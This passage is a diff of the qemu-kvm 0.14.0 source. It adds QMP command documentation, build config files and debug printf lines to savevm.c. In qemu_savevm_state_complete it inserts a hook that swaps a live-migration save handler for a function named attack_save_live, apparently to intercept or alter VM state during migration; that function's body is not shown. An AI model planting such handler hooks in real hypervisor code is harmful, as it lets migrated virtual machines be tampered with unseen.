+- "uri": Destination URI (json-string)
+
+Example:
+
+-> { "execute": "migrate", "arguments": { "uri": "tcp:0:4446" } }
+<- { "return": {} }
+
+Notes:
+
+(1) The 'query-migrate' command should be used to check migration's progress
+    and final result (this information is provided by the 'status' member)
+(2) All boolean arguments default to false
+(3) The user Monitor's "detach" argument is invalid in QMP and should not
+    be used
+
+migrate_cancel
+--------------
+
+Cancel the current migration.
+
+Arguments: None.
+
+Example:
+
+-> { "execute": "migrate_cancel" }
+<- { "return": {} }
+
+client_migrate_info
+------------------
+
+Set the spice/vnc connection info for the migration target.  The spice/vnc
+server will ask the spice/vnc client to automatically reconnect using the
+new parameters (if specified) once the vm migration finished successfully.
+
+Arguments:
+
+- "protocol":     protocol: "spice" or "vnc" (json-string)
+- "hostname":     migration target hostname (json-string)
+- "port":         spice/vnc tcp port for plaintext channels (json-int, optional)
+- "tls-port":     spice tcp port for tls-secured channels (json-int, optional)
+- "cert-subject": server certificate subject (json-string, optional)
+
+Example:
+
+-> { "execute": "client_migrate_info",
+     "arguments": { "protocol": "spice",
+                    "hostname": "virt42.lab.kraxel.org",
+                    "port": 1234 } }
+<- { "return": {} }
+
+migrate_set_speed
+-----------------
+
+Set maximum speed for migrations.
+
+Arguments:
+
+- "value": maximum speed, in bytes per second (json-int)
+
+Example:
+
+-> { "execute": "migrate_set_speed", "arguments": { "value": 1024 } }
+<- { "return": {} }
+
+migrate_set_downtime
+--------------------
+
+Set maximum tolerated downtime (in seconds) for migrations.
+
+Arguments:
+
+- "value": maximum downtime (json-number)
+
+Example:
+
+-> { "execute": "migrate_set_downtime", "arguments": { "value": 0.1 } }
+<- { "return": {} }
+
+netdev_add
+----------
+
+Add host network device.
+
+Arguments:
+
+- "type": the device type, "tap", "user", ... (json-string)
+- "id": the device's ID, must be unique (json-string)
+- device options
+
+Example:
+
+-> { "execute": "netdev_add", "arguments": { "type": "user", "id": "netdev1" } }
+<- { "return": {} }
+
+Note: The supported device options are the same ones supported by the '-net'
+      command-line argument, which are listed in the '-help' output or QEMU's
+      manual
+
+netdev_del
+----------
+
+Remove host network device.
+
+Arguments:
+
+- "id": the device's ID, must be unique (json-string)
+
+Example:
+
+-> { "execute": "netdev_del", "arguments": { "id": "netdev1" } }
+<- { "return": {} }
+
+
+block_resize
+------------
+
+Resize a block image while a guest is running.
+
+Arguments:
+
+- "device": the device's ID, must be unique (json-string)
+- "size": new size
+
+Example:
+
+-> { "execute": "block_resize", "arguments": { "device": "scratch", "size": 1073741824 } }
+<- { "return": {} }
+
+balloon
+-------
+
+Request VM to change its memory allocation (in bytes).
+
+Arguments:
+
+- "value": New memory allocation (json-int)
+
+Example:
+
+-> { "execute": "balloon", "arguments": { "value": 536870912 } }
+<- { "return": {} }
+
+set_link
+--------
+
+Change the link status of a network adapter.
+
+Arguments:
+
+- "name": network device name (json-string)
+- "up": status is up (json-bool)
+
+Example:
+
+-> { "execute": "set_link", "arguments": { "name": "e1000.0", "up": false } }
+<- { "return": {} }
+
+getfd
+-----
+
+Receive a file descriptor via SCM rights and assign it a name.
+
+Arguments:
+
+- "fdname": file descriptor name (json-string)
+
+Example:
+
+-> { "execute": "getfd", "arguments": { "fdname": "fd1" } }
+<- { "return": {} }
+
+closefd
+-------
+
+Close a file descriptor previously passed via SCM rights.
+
+Arguments:
+
+- "fdname": file descriptor name (json-string)
+
+Example:
+
+-> { "execute": "closefd", "arguments": { "fdname": "fd1" } }
+<- { "return": {} }
+
+block_passwd
+------------
+
+Set the password of encrypted block devices.
+
+Arguments:
+
+- "device": device name (json-string)
+- "password": password (json-string)
+
+Example:
+
+-> { "execute": "block_passwd", "arguments": { "device": "ide0-hd0",
+                                               "password": "12345" } }
+<- { "return": {} }
+
+set_password
+------------
+
+Set the password for vnc/spice protocols.
+
+Arguments:
+
+- "protocol": protocol name (json-string)
+- "password": password (json-string)
+- "connected": [ keep | disconnect | fail ] (josn-string, optional)
+
+Example:
+
+-> { "execute": "set_password", "arguments": { "protocol": "vnc",
+                                               "password": "secret" } }
+<- { "return": {} }
+
+expire_password
+---------------
+
+Set the password expire time for vnc/spice protocols.
+
+Arguments:
+
+- "protocol": protocol name (json-string)
+- "time": [ now | never | +secs | secs ] (json-string)
+
+Example:
+
+-> { "execute": "expire_password", "arguments": { "protocol": "vnc",
+                                                  "time": "+60" } }
+<- { "return": {} }
+
+qmp_capabilities
+----------------
+
+Enable QMP capabilities.
+
+Arguments: None.
+
+Example:
+
+-> { "execute": "qmp_capabilities" }
+<- { "return": {} }
+
+Note: This command must be issued before issuing any other command.
+
+human-monitor-command
+---------------------
+
+Execute a Human Monitor command.
+
+Arguments: 
+
+- command-line: the command name and its arguments, just like the
+                Human Monitor's shell (json-string)
+- cpu-index: select the CPU number to be used by commands which access CPU
+             data, like 'info registers'. The Monitor selects CPU 0 if this
+             argument is not provided (json-int, optional)
+
+Example:
+
+-> { "execute": "human-monitor-command", "arguments": { "command-line": "info kvm" } }
+<- { "return": "kvm support: enabled
+" }
+
+Notes:
+
+(1) The Human Monitor is NOT an stable interface, this means that command
+    names, arguments and responses can change or be removed at ANY time.
+    Applications that rely on long term stability guarantees should NOT
+    use this command
+
+(2) Limitations:
+
+    o This command is stateless, this means that commands that depend
+      on state information (such as getfd) might not work
+
+    o Commands that prompt the user for data (eg. 'cont' when the block
+      device is encrypted) don't currently work
+
+3. Query Commands
+=================
+
+
+query-version
+-------------
+
+Show QEMU version.
+
+Return a json-object with the following information:
+
+- "qemu": A json-object containing three integer values:
+    - "major": QEMU's major version (json-int)
+    - "minor": QEMU's minor version (json-int)
+    - "micro": QEMU's micro version (json-int)
+- "package": package's version (json-string)
+
+Example:
+
+-> { "execute": "query-version" }
+<- {
+      "return":{
+         "qemu":{
+            "major":0,
+            "minor":11,
+            "micro":5
+         },
+         "package":""
+      }
+   }
+
+query-commands
+--------------
+
+List QMP available commands.
+
+Each command is represented by a json-object, the returned value is a json-array
+of all commands.
+
+Each json-object contain:
+
+- "name": command's name (json-string)
+
+Example:
+
+-> { "execute": "query-commands" }
+<- {
+      "return":[
+         {
+            "name":"query-balloon"
+         },
+         {
+            "name":"system_powerdown"
+         }
+      ]
+   }
+
+Note: This example has been shortened as the real response is too long.
+
+query-chardev
+-------------
+
+Each device is represented by a json-object. The returned value is a json-array
+of all devices.
+
+Each json-object contain the following:
+
+- "label": device's label (json-string)
+- "filename": device's file (json-string)
+
+Example:
+
+-> { "execute": "query-chardev" }
+<- {
+      "return":[
+         {
+            "label":"monitor",
+            "filename":"stdio"
+         },
+         {
+            "label":"serial0",
+            "filename":"vc"
+         }
+      ]
+   }
+
+query-block
+-----------
+
+Show the block devices.
+
+Each block device information is stored in a json-object and the returned value
+is a json-array of all devices.
+
+Each json-object contain the following:
+
+- "device": device name (json-string)
+- "type": device type (json-string)
+         - Possible values: "hd", "cdrom", "floppy", "unknown"
+- "removable": true if the device is removable, false otherwise (json-bool)
+- "locked": true if the device is locked, false otherwise (json-bool)
+- "inserted": only present if the device is inserted, it is a json-object
+   containing the following:
+         - "file": device file name (json-string)
+         - "ro": true if read-only, false otherwise (json-bool)
+         - "drv": driver format name (json-string)
+             - Possible values: "blkdebug", "bochs", "cloop", "cow", "dmg",
+                                "file", "file", "ftp", "ftps", "host_cdrom",
+                                "host_device", "host_floppy", "http", "https",
+                                "nbd", "parallels", "qcow", "qcow2", "raw",
+                                "tftp", "vdi", "vmdk", "vpc", "vvfat"
+         - "backing_file": backing file name (json-string, optional)
+         - "encrypted": true if encrypted, false otherwise (json-bool)
+
+Example:
+
+-> { "execute": "query-block" }
+<- {
+      "return":[
+         {
+            "device":"ide0-hd0",
+            "locked":false,
+            "removable":false,
+            "inserted":{
+               "ro":false,
+               "drv":"qcow2",
+               "encrypted":false,
+               "file":"disks/test.img"
+            },
+            "type":"hd"
+         },
+         {
+            "device":"ide1-cd0",
+            "locked":false,
+            "removable":true,
+            "type":"cdrom"
+         },
+         {
+            "device":"floppy0",
+            "locked":false,
+            "removable":true,
+            "type": "floppy"
+         },
+         {
+            "device":"sd0",
+            "locked":false,
+            "removable":true,
+            "type":"floppy"
+         }
+      ]
+   }
+
+query-blockstats
+----------------
+
+Show block device statistics.
+
+Each device statistic information is stored in a json-object and the returned
+value is a json-array of all devices.
+
+Each json-object contain the following:
+
+- "device": device name (json-string)
+- "stats": A json-object with the statistics information, it contains:
+    - "rd_bytes": bytes read (json-int)
+    - "wr_bytes": bytes written (json-int)
+    - "rd_operations": read operations (json-int)
+    - "wr_operations": write operations (json-int)
+    - "wr_highest_offset": Highest offset of a sector written since the
+                           BlockDriverState has been opened (json-int)
+- "parent": Contains recursively the statistics of the underlying
+            protocol (e.g. the host file for a qcow2 image). If there is
+            no underlying protocol, this field is omitted
+            (json-object, optional)
+
+Example:
+
+-> { "execute": "query-blockstats" }
+<- {
+      "return":[
+         {
+            "device":"ide0-hd0",
+            "parent":{
+               "stats":{
+                  "wr_highest_offset":3686448128,
+                  "wr_bytes":9786368,
+                  "wr_operations":751,
+                  "rd_bytes":122567168,
+                  "rd_operations":36772
+               }
+            },
+            "stats":{
+               "wr_highest_offset":2821110784,
+               "wr_bytes":9786368,
+               "wr_operations":692,
+               "rd_bytes":122739200,
+               "rd_operations":36604
+            }
+         },
+         {
+            "device":"ide1-cd0",
+            "stats":{
+               "wr_highest_offset":0,
+               "wr_bytes":0,
+               "wr_operations":0,
+               "rd_bytes":0,
+               "rd_operations":0
+            }
+         },
+         {
+            "device":"floppy0",
+            "stats":{
+               "wr_highest_offset":0,
+               "wr_bytes":0,
+               "wr_operations":0,
+               "rd_bytes":0,
+               "rd_operations":0
+            }
+         },
+         {
+            "device":"sd0",
+            "stats":{
+               "wr_highest_offset":0,
+               "wr_bytes":0,
+               "wr_operations":0,
+               "rd_bytes":0,
+               "rd_operations":0
+            }
+         }
+      ]
+   }
+
+query-cpus
+----------
+
+Show CPU information.
+
+Return a json-array. Each CPU is represented by a json-object, which contains:
+
+- "CPU": CPU index (json-int)
+- "current": true if this is the current CPU, false otherwise (json-bool)
+- "halted": true if the cpu is halted, false otherwise (json-bool)
+- Current program counter. The key's name depends on the architecture:
+     "pc": i386/x86_64 (json-int)
+     "nip": PPC (json-int)
+     "pc" and "npc": sparc (json-int)
+     "PC": mips (json-int)
+
+Example:
+
+-> { "execute": "query-cpus" }
+<- {
+      "return":[
+         {
+            "CPU":0,
+            "current":true,
+            "halted":false,
+            "pc":3227107138
+         },
+         {
+            "CPU":1,
+            "current":false,
+            "halted":true,
+            "pc":7108165
+         }
+      ]
+   }
+
+query-pci
+---------
+
+PCI buses and devices information.
+
+The returned value is a json-array of all buses. Each bus is represented by
+a json-object, which has a key with a json-array of all PCI devices attached
+to it. Each device is represented by a json-object.
+
+The bus json-object contains the following:
+
+- "bus": bus number (json-int)
+- "devices": a json-array of json-objects, each json-object represents a
+             PCI device
+
+The PCI device json-object contains the following:
+
+- "bus": identical to the parent's bus number (json-int)
+- "slot": slot number (json-int)
+- "function": function number (json-int)
+- "class_info": a json-object containing:
+     - "desc": device class description (json-string, optional)
+     - "class": device class number (json-int)
+- "id": a json-object containing:
+     - "device": device ID (json-int)
+     - "vendor": vendor ID (json-int)
+- "irq": device's IRQ if assigned (json-int, optional)
+- "qdev_id": qdev id string (json-string)
+- "pci_bridge": It's a json-object, only present if this device is a
+                PCI bridge, contains:
+     - "bus": bus number (json-int)
+     - "secondary": secondary bus number (json-int)
+     - "subordinate": subordinate bus number (json-int)
+     - "io_range": I/O memory range information, a json-object with the
+                   following members:
+                 - "base": base address, in bytes (json-int)
+                 - "limit": limit address, in bytes (json-int)
+     - "memory_range": memory range information, a json-object with the
+                       following members:
+                 - "base": base address, in bytes (json-int)
+                 - "limit": limit address, in bytes (json-int)
+     - "prefetchable_range": Prefetchable memory range information, a
+                             json-object with the following members:
+                 - "base": base address, in bytes (json-int)
+                 - "limit": limit address, in bytes (json-int)
+     - "devices": a json-array of PCI devices if there's any attached, each
+                  each element is represented by a json-object, which contains
+                  the same members of the 'PCI device json-object' described
+                  above (optional)
+- "regions": a json-array of json-objects, each json-object represents a
+             memory region of this device
+
+The memory range json-object contains the following:
+
+- "base": base memory address (json-int)
+- "limit": limit value (json-int)
+
+The region json-object can be an I/O region or a memory region, an I/O region
+json-object contains the following:
+
+- "type": "io" (json-string, fixed)
+- "bar": BAR number (json-int)
+- "address": memory address (json-int)
+- "size": memory size (json-int)
+
+A memory region json-object contains the following:
+
+- "type": "memory" (json-string, fixed)
+- "bar": BAR number (json-int)
+- "address": memory address (json-int)
+- "size": memory size (json-int)
+- "mem_type_64": true or false (json-bool)
+- "prefetch": true or false (json-bool)
+
+Example:
+
+-> { "execute": "query-pci" }
+<- {
+      "return":[
+         {
+            "bus":0,
+            "devices":[
+               {
+                  "bus":0,
+                  "qdev_id":"",
+                  "slot":0,
+                  "class_info":{
+                     "class":1536,
+                     "desc":"Host bridge"
+                  },
+                  "id":{
+                     "device":32902,
+                     "vendor":4663
+                  },
+                  "function":0,
+                  "regions":[
+   
+                  ]
+               },
+               {
+                  "bus":0,
+                  "qdev_id":"",
+                  "slot":1,
+                  "class_info":{
+                     "class":1537,
+                     "desc":"ISA bridge"
+                  },
+                  "id":{
+                     "device":32902,
+                     "vendor":28672
+                  },
+                  "function":0,
+                  "regions":[
+   
+                  ]
+               },
+               {
+                  "bus":0,
+                  "qdev_id":"",
+                  "slot":1,
+                  "class_info":{
+                     "class":257,
+                     "desc":"IDE controller"
+                  },
+                  "id":{
+                     "device":32902,
+                     "vendor":28688
+                  },
+                  "function":1,
+                  "regions":[
+                     {
+                        "bar":4,
+                        "size":16,
+                        "address":49152,
+                        "type":"io"
+                     }
+                  ]
+               },
+               {
+                  "bus":0,
+                  "qdev_id":"",
+                  "slot":2,
+                  "class_info":{
+                     "class":768,
+                     "desc":"VGA controller"
+                  },
+                  "id":{
+                     "device":4115,
+                     "vendor":184
+                  },
+                  "function":0,
+                  "regions":[
+                     {
+                        "prefetch":true,
+                        "mem_type_64":false,
+                        "bar":0,
+                        "size":33554432,
+                        "address":4026531840,
+                        "type":"memory"
+                     },
+                     {
+                        "prefetch":false,
+                        "mem_type_64":false,
+                        "bar":1,
+                        "size":4096,
+                        "address":4060086272,
+                        "type":"memory"
+                     },
+                     {
+                        "prefetch":false,
+                        "mem_type_64":false,
+                        "bar":6,
+                        "size":65536,
+                        "address":-1,
+                        "type":"memory"
+                     }
+                  ]
+               },
+               {
+                  "bus":0,
+                  "qdev_id":"",
+                  "irq":11,
+                  "slot":4,
+                  "class_info":{
+                     "class":1280,
+                     "desc":"RAM controller"
+                  },
+                  "id":{
+                     "device":6900,
+                     "vendor":4098
+                  },
+                  "function":0,
+                  "regions":[
+                     {
+                        "bar":0,
+                        "size":32,
+                        "address":49280,
+                        "type":"io"
+                     }
+                  ]
+               }
+            ]
+         }
+      ]
+   }
+
+Note: This example has been shortened as the real response is too long.
+
+query-kvm
+---------
+
+Show KVM information.
+
+Return a json-object with the following information:
+
+- "enabled": true if KVM support is enabled, false otherwise (json-bool)
+- "present": true if QEMU has KVM support, false otherwise (json-bool)
+
+Example:
+
+-> { "execute": "query-kvm" }
+<- { "return": { "enabled": true, "present": true } }
+
+query-status
+------------
+
+Return a json-object with the following information:
+
+- "running": true if the VM is running, or false if it is paused (json-bool)
+- "singlestep": true if the VM is in single step mode,
+                false otherwise (json-bool)
+
+Example:
+
+-> { "execute": "query-status" }
+<- { "return": { "running": true, "singlestep": false } }
+
+query-mice
+----------
+
+Show VM mice information.
+
+Each mouse is represented by a json-object, the returned value is a json-array
+of all mice.
+
+The mouse json-object contains the following:
+
+- "name": mouse's name (json-string)
+- "index": mouse's index (json-int)
+- "current": true if this mouse is receiving events, false otherwise (json-bool)
+- "absolute": true if the mouse generates absolute input events (json-bool)
+
+Example:
+
+-> { "execute": "query-mice" }
+<- {
+      "return":[
+         {
+            "name":"QEMU Microsoft Mouse",
+            "index":0,
+            "current":false,
+            "absolute":false
+         },
+         {
+            "name":"QEMU PS/2 Mouse",
+            "index":1,
+            "current":true,
+            "absolute":true
+         }
+      ]
+   }
+
+query-vnc
+---------
+
+Show VNC server information.
+
+Return a json-object with server information. Connected clients are returned
+as a json-array of json-objects.
+
+The main json-object contains the following:
+
+- "enabled": true or false (json-bool)
+- "host": server's IP address (json-string)
+- "family": address family (json-string)
+         - Possible values: "ipv4", "ipv6", "unix", "unknown"
+- "service": server's port number (json-string)
+- "auth": authentication method (json-string)
+         - Possible values: "invalid", "none", "ra2", "ra2ne", "sasl", "tight",
+                            "tls", "ultra", "unknown", "vencrypt", "vencrypt",
+                            "vencrypt+plain", "vencrypt+tls+none",
+                            "vencrypt+tls+plain", "vencrypt+tls+sasl",
+                            "vencrypt+tls+vnc", "vencrypt+x509+none",
+                            "vencrypt+x509+plain", "vencrypt+x509+sasl",
+                            "vencrypt+x509+vnc", "vnc"
+- "clients": a json-array of all connected clients
+
+Clients are described by a json-object, each one contain the following:
+
+- "host": client's IP address (json-string)
+- "family": address family (json-string)
+         - Possible values: "ipv4", "ipv6", "unix", "unknown"
+- "service": client's port number (json-string)
+- "x509_dname": TLS dname (json-string, optional)
+- "sasl_username": SASL username (json-string, optional)
+
+Example:
+
+-> { "execute": "query-vnc" }
+<- {
+      "return":{
+         "enabled":true,
+         "host":"0.0.0.0",
+         "service":"50402",
+         "auth":"vnc",
+         "family":"ipv4",
+         "clients":[
+            {
+               "host":"127.0.0.1",
+               "service":"50401",
+               "family":"ipv4"
+            }
+         ]
+      }
+   }
+
+query-spice
+-----------
+
+Show SPICE server information.
+
+Return a json-object with server information. Connected clients are returned
+as a json-array of json-objects.
+
+The main json-object contains the following:
+
+- "enabled": true or false (json-bool)
+- "host": server's IP address (json-string)
+- "port": server's port number (json-int, optional)
+- "tls-port": server's port number (json-int, optional)
+- "auth": authentication method (json-string)
+         - Possible values: "none", "spice"
+- "channels": a json-array of all active channels clients
+
+Channels are described by a json-object, each one contain the following:
+
+- "host": client's IP address (json-string)
+- "family": address family (json-string)
+         - Possible values: "ipv4", "ipv6", "unix", "unknown"
+- "port": client's port number (json-string)
+- "connection-id": spice connection id.  All channels with the same id
+                   belong to the same spice session (json-int)
+- "channel-type": channel type.  "1" is the main control channel, filter for
+                  this one if you want track spice sessions only (json-int)
+- "channel-id": channel id.  Usually "0", might be different needed when
+                multiple channels of the same type exist, such as multiple
+                display channels in a multihead setup (json-int)
+- "tls": whevener the channel is encrypted (json-bool)
+
+Example:
+
+-> { "execute": "query-spice" }
+<- {
+      "return": {
+         "enabled": true,
+         "auth": "spice",
+         "port": 5920,
+         "tls-port": 5921,
+         "host": "0.0.0.0",
+         "channels": [
+            {
+               "port": "54924",
+               "family": "ipv4",
+               "channel-type": 1,
+               "connection-id": 1804289383,
+               "host": "127.0.0.1",
+               "channel-id": 0,
+               "tls": true
+            },
+            {
+               "port": "36710",
+               "family": "ipv4",
+               "channel-type": 4,
+               "connection-id": 1804289383,
+               "host": "127.0.0.1",
+               "channel-id": 0,
+               "tls": false
+            },
+            [ ... more channels follow ... ]
+         ]
+      }
+   }
+
+query-name
+----------
+
+Show VM name.
+
+Return a json-object with the following information:
+
+- "name": VM's name (json-string, optional)
+
+Example:
+
+-> { "execute": "query-name" }
+<- { "return": { "name": "qemu-name" } }
+
+query-uuid
+----------
+
+Show VM UUID.
+
+Return a json-object with the following information:
+
+- "UUID": Universally Unique Identifier (json-string)
+
+Example:
+
+-> { "execute": "query-uuid" }
+<- { "return": { "UUID": "550e8400-e29b-41d4-a716-446655440000" } }
+
+query-migrate
+-------------
+
+Migration status.
+
+Return a json-object. If migration is active there will be another json-object
+with RAM migration status and if block migration is active another one with
+block migration status.
+
+The main json-object contains the following:
+
+- "status": migration status (json-string)
+     - Possible values: "active", "completed", "failed", "cancelled"
+- "ram": only present if "status" is "active", it is a json-object with the
+  following RAM information (in bytes):
+         - "transferred": amount transferred (json-int)
+         - "remaining": amount remaining (json-int)
+         - "total": total (json-int)
+- "disk": only present if "status" is "active" and it is a block migration,
+  it is a json-object with the following disk information (in bytes):
+         - "transferred": amount transferred (json-int)
+         - "remaining": amount remaining (json-int)
+         - "total": total (json-int)
+
+Examples:
+
+1. Before the first migration
+
+-> { "execute": "query-migrate" }
+<- { "return": {} }
+
+2. Migration is done and has succeeded
+
+-> { "execute": "query-migrate" }
+<- { "return": { "status": "completed" } }
+
+3. Migration is done and has failed
+
+-> { "execute": "query-migrate" }
+<- { "return": { "status": "failed" } }
+
+4. Migration is being performed and is not a block migration:
+
+-> { "execute": "query-migrate" }
+<- {
+      "return":{
+         "status":"active",
+         "ram":{
+            "transferred":123,
+            "remaining":123,
+            "total":246
+         }
+      }
+   }
+
+5. Migration is being performed and is a block migration:
+
+-> { "execute": "query-migrate" }
+<- {
+      "return":{
+         "status":"active",
+         "ram":{
+            "total":1057024,
+            "remaining":1053304,
+            "transferred":3720
+         },
+         "disk":{
+            "total":20971520,
+            "remaining":20880384,
+            "transferred":91136
+         }
+      }
+   }
+
+query-balloon
+-------------
+
+Show balloon information.
+
+Make an asynchronous request for balloon info. When the request completes a
+json-object will be returned containing the following data:
+
+- "actual": current balloon value in bytes (json-int)
+- "mem_swapped_in": Amount of memory swapped in bytes (json-int, optional)
+- "mem_swapped_out": Amount of memory swapped out in bytes (json-int, optional)
+- "major_page_faults": Number of major faults (json-int, optional)
+- "minor_page_faults": Number of minor faults (json-int, optional)
+- "free_mem": Total amount of free and unused memory in
+              bytes (json-int, optional)
+- "total_mem": Total amount of available memory in bytes (json-int, optional)
+
+Example:
+
+-> { "execute": "query-balloon" }
+<- {
+      "return":{
+         "actual":1073741824,
+         "mem_swapped_in":0,
+         "mem_swapped_out":0,
+         "major_page_faults":142,
+         "minor_page_faults":239245,
+         "free_mem":1014185984,
+         "total_mem":1044668416
+      }
+   }
+
diff -Nurp qemu-kvm-0.14.0+noroms.orig/roms/seabios/config.mak qemu-kvm-0.14.0+noroms/roms/seabios/config.mak
--- qemu-kvm-0.14.0+noroms.orig/roms/seabios/config.mak	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/roms/seabios/config.mak	2014-02-19 10:12:31.000000000 -0500
@@ -0,0 +1,8 @@
+# Automatically generated by configure - do not modify
+SRC_PATH=/home/joepleso/src/qemu-kvm-0.14.0+noroms/roms/seabios
+CC=gcc
+BCC=bcc
+CPP=cpp
+OBJCOPY=objcopy
+IASL=iasl
+LD=ld
diff -Nurp qemu-kvm-0.14.0+noroms.orig/roms/vgabios/config.mak qemu-kvm-0.14.0+noroms/roms/vgabios/config.mak
--- qemu-kvm-0.14.0+noroms.orig/roms/vgabios/config.mak	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/roms/vgabios/config.mak	2014-02-19 10:12:31.000000000 -0500
@@ -0,0 +1,8 @@
+# Automatically generated by configure - do not modify
+SRC_PATH=/home/joepleso/src/qemu-kvm-0.14.0+noroms/roms/vgabios
+CC=gcc
+BCC=bcc
+CPP=cpp
+OBJCOPY=objcopy
+IASL=iasl
+LD=ld
diff -Nurp qemu-kvm-0.14.0+noroms.orig/rules.mak qemu-kvm-0.14.0+noroms/rules.mak
--- qemu-kvm-0.14.0+noroms.orig/rules.mak	2014-02-21 10:59:49.956708099 -0500
+++ qemu-kvm-0.14.0+noroms/rules.mak	1969-12-31 19:00:00.000000000 -0500
@@ -1,64 +0,0 @@
-
-# Don't use implicit rules or variables
-# we have explicit rules for everything
-MAKEFLAGS += -rR
-
-# Files with this suffixes are final, don't try to generate them
-# using implicit rules
-%.d:
-%.h:
-%.c:
-%.m:
-%.mak:
-
-# Flags for dependency generation
-QEMU_DGFLAGS += -MMD -MP -MT $@ -MF $(*D)/$(*F).d
-
-%.o: %.c
-	$(call quiet-command,$(CC) $(QEMU_CFLAGS) $(QEMU_INCLUDES) $(QEMU_DGFLAGS) $(CFLAGS) -c -o $@ $<,"  CC    $(TARGET_DIR)$@")
-
-%.o: %.S
-	$(call quiet-command,$(CC) $(QEMU_CFLAGS) $(QEMU_INCLUDES) $(QEMU_DGFLAGS) $(CFLAGS) -c -o $@ $<,"  AS    $(TARGET_DIR)$@")
-
-%.o: %.m
-	$(call quiet-command,$(CC) $(QEMU_CFLAGS) $(QEMU_INCLUDES) $(QEMU_DGFLAGS) $(CFLAGS) -c -o $@ $<,"  OBJC  $(TARGET_DIR)$@")
-
-LINK = $(call quiet-command,$(CC) $(QEMU_CFLAGS) $(CFLAGS) $(LDFLAGS) -o $@ $(1) $(LIBS),"  LINK  $(TARGET_DIR)$@")
-
-%$(EXESUF): %.o
-	$(call LINK,$^)
-
-%.a:
-	$(call quiet-command,rm -f $@ && $(AR) rcs $@ $^,"  AR    $(TARGET_DIR)$@")
-
-quiet-command = $(if $(V),$1,$(if $(2),@echo $2 && $1, @$1))
-
-# cc-option
-# Usage: CFLAGS+=$(call cc-option, -falign-functions=0, -malign-functions=0)
-
-cc-option = $(if $(shell $(CC) $1 $2 -S -o /dev/null -xc /dev/null \
-              >/dev/null 2>&1 && echo OK), $2, $3)
-
-VPATH_SUFFIXES = %.c %.h %.S %.m %.mak %.texi
-set-vpath = $(if $1,$(foreach PATTERN,$(VPATH_SUFFIXES),$(eval vpath $(PATTERN) $1)))
-
-# find-in-path
-# Usage: $(call find-in-path, prog)
-# Looks in the PATH if the argument contains no slash, else only considers one
-# specific directory.  Returns an # empty string if the program doesn't exist
-# there.
-find-in-path = $(if $(find-string /, $1), \
-        $(wildcard $1), \
-        $(wildcard $(patsubst %, %/$1, $(subst :, ,$(PATH)))))
-
-# Generate timestamp files for .h include files
-
-%.h: %.h-timestamp
-	@test -f $@ || cp $< $@
-
-%.h-timestamp: %.mak
-	$(call quiet-command, sh $(SRC_PATH)/scripts/create_config < $< > $@, "  GEN   $*.h")
-	@cmp $@ $*.h >/dev/null 2>&1 || cp $@ $*.h
-
-# will delete the target of a rule if commands exit with a nonzero exit status
-.DELETE_ON_ERROR:
diff -Nurp qemu-kvm-0.14.0+noroms.orig/savevm.c qemu-kvm-0.14.0+noroms/savevm.c
--- qemu-kvm-0.14.0+noroms.orig/savevm.c	2014-02-21 10:59:49.937707665 -0500
+++ qemu-kvm-0.14.0+noroms/savevm.c	2014-02-19 10:12:19.000000000 -0500
@@ -1371,10 +1371,15 @@ void vmstate_save_state(QEMUFile *f, con
 {
     VMStateField *field = vmsd->fields;
 
+    printf("In vmstate_save_state (StateDescription=%s)\n", vmsd->name);
+
     if (vmsd->pre_save) {
         vmsd->pre_save(opaque);
     }
     while(field->name) {
+	if (0) {
+	    printf("\t%s\n", field->name);
+	}
         if (!field->field_exists ||
             field->field_exists(opaque, vmsd->version_id)) {
             void *base_addr = opaque + field->offset;
@@ -1404,7 +1409,17 @@ void vmstate_save_state(QEMUFile *f, con
                     addr = *(void **)addr;
                 }
                 if (field->flags & VMS_STRUCT) {
-                    vmstate_save_state(f, field->vmsd, addr);
+		    
+		    if (0) {
+			/* commented out jfp */
+			uint8_t marker_buf[16];
+			
+			memset(marker_buf, 0xfa, 16);
+			
+			qemu_put_buffer(f, marker_buf, 16);
+		    }
+		    
+		  vmstate_save_state(f, field->vmsd, addr);
                 } else {
                     field->info->put(f, addr, size);
                 }
@@ -1462,6 +1477,9 @@ int qemu_savevm_state_begin(Monitor *mon
 {
     SaveStateEntry *se;
 
+    /* debug jfp enter begin */
+    printf("entering qemu_savevm_state_begin\n");
+
     QTAILQ_FOREACH(se, &savevm_handlers, entry) {
         if(se->set_params == NULL) {
             continue;
@@ -1478,6 +1496,9 @@ int qemu_savevm_state_begin(Monitor *mon
         if (se->save_live_state == NULL)
             continue;
 
+	/* debug jfp  print id of each save entry*/
+	printf("%s\n", se->idstr);
+
         /* Section type */
         qemu_put_byte(f, QEMU_VM_SECTION_START);
         qemu_put_be32(f, se->section_id);
@@ -1506,6 +1527,9 @@ int qemu_savevm_state_iterate(Monitor *m
     SaveStateEntry *se;
     int ret = 1;
 
+    /* debug jfp enter iterate*/
+    printf("entering qemu_savevm_state_iterate\n");
+
     QTAILQ_FOREACH(se, &savevm_handlers, entry) {
         if (se->save_live_state == NULL)
             continue;
@@ -1514,6 +1538,9 @@ int qemu_savevm_state_iterate(Monitor *m
         qemu_put_byte(f, QEMU_VM_SECTION_PART);
         qemu_put_be32(f, se->section_id);
 
+	/* debug jfp print id of every save entry*/
+	printf("%s\n", se->idstr);
+
         ret = se->save_live_state(mon, f, QEMU_VM_SECTION_PART, se->opaque);
         if (!ret) {
             /* Do not proceed to the next vmstate before this one reported
@@ -1524,27 +1551,63 @@ int qemu_savevm_state_iterate(Monitor *m
         }
     }
 
-    if (ret)
-        return 1;
+    if (ret){
+      printf("jfp: iterate returning 1\n");
+      return 1;
+
+    }
 
     if (qemu_file_has_error(f)) {
         qemu_savevm_state_cancel(mon, f);
         return -EIO;
     }
 
+
+    printf("jfp: iterate returning 0\n");
     return 0;
 }
 
+
+
+
+
 int qemu_savevm_state_complete(Monitor *mon, QEMUFile *f)
 {
     SaveStateEntry *se;
 
     cpu_synchronize_all_states();
 
+    {
+      /* debug jfp enter complete*/
+      if (mon == NULL)
+	printf("ohno\n");
+      
+      QTAILQ_FOREACH(se, &savevm_handlers, entry) {
+        if (se->save_live_state == NULL)
+	  continue;
+	
+	/* hook into handler */
+	attack_save_live(NULL,NULL,0,se->save_live_state);
+	se->save_live_state = attack_save_live;
+	break;
+      }
+      printf("entering qemu_savevm_state_complete\n");
+    }
+
     QTAILQ_FOREACH(se, &savevm_handlers, entry) {
         if (se->save_live_state == NULL)
             continue;
 
+	
+	if(0){
+	  /* debug commented out jfp */ 
+	  uint8_t marker[16];
+	    memset(marker, 0xfb, 16);
